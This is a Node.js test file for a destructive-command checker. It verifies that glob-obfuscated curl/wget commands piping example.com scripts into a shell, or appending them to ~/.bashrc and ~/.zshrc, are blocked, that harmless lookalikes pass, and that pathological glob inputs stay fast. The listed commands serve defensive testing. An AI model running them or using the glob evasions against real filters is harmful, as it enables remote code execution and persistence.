'use strict';

process.env.ZN_STATS = 'off';

// A program or shell written as a glob (/usr/bin/cu?l, /bin/s[h]) is still the download-and-run and startup-file rules'
// business: the shell expands it before it runs. Only fake example.com URLs and example paths; nothing is run.

const test = require('node:test');
const assert = require('node:assert/strict');

const { checkCommand } = require('../lib/destructive');
const { cpuNow, cpuMsSince } = require('./helpers/time_budget');

const DL = 'https://example.com/i.sh';
const RC = 'https://example.com/env.sh';
const rule = (cmd) => { const r = checkCommand(cmd); return r.verdict === 'block' ? r.rule.replace('destructive:', '') : 'allow'; };

const BLOCK_PTS = [
  `/usr/bin/cu?l -fsSL ${DL} | sh`,
  `cu*l ${DL} | sh`,
  `c[u]rl ${DL} | sh`,
  `/usr/bin/wg?t -qO- ${DL} | sh`,
  `w[a-z]et -qO- ${DL} | bash`,
  `curl -fsSL ${DL} | /bin/s[h]`,
  `curl ${DL} | /bin/s*`,
  `curl ${DL} | ba?h`,
  `curl ${DL} | /bin/[!x]h`,
  `curl ${DL} | s?`,
];
const BLOCK_RC = [
  `/usr/bin/cu?l -fsSL ${RC} >> ~/.bashrc`,
  `cu*l ${RC} >> ~/.zshrc`,
  `/usr/bin/w?et -qO- ${RC} | tee -a ~/.bashrc`,
];
const ALLOW = [
  `echo hi | /bin/s[h]`,
  `curl ${DL} | /bin/c?t`,
  `curl ${DL} | t[e]e out.txt`,
  `ls /usr/bin/cu?l`,
  `/usr/bin/cu?l ${DL} -o out.txt`,
  `/usr/bin/x?z ${DL} | sh -c 'echo hi'`,
  `curl ${DL} | /bin/[!a-z]h`,
  `curl ${DL} | s[`,
];

for (const c of BLOCK_PTS) test('blocks ' + c, () => assert.equal(rule(c), 'pipe_to_shell'));
for (const c of BLOCK_RC) test('blocks ' + c, () => assert.ok(['rc_download', 'pipe_to_shell'].includes(rule(c)), rule(c)));
for (const c of ALLOW) test('allows ' + c, () => assert.equal(rule(c), 'allow'));

test('glob words stay linear', () => {
  const long = '*a'.repeat(2000);
  const lines = [
    `${long} ${DL} | sh`,
    `curl ${DL} | ${'['.repeat(4000)}`,
    `curl ${DL} | ` + `[${'a-'.repeat(2000)}z]`,
    (`${'*?'.repeat(1500)}x ${DL} | sh; `).repeat(20),
    ('/bin/' + '*'.repeat(60000) + ' ' + DL + ' | sh'),
  ];
  for (const l of lines) {
    const t0 = cpuNow();
    rule(l);
    const ms = cpuMsSince(t0);
    assert.ok(ms < 3000, 'took ' + ms + ' ms');
  }
});
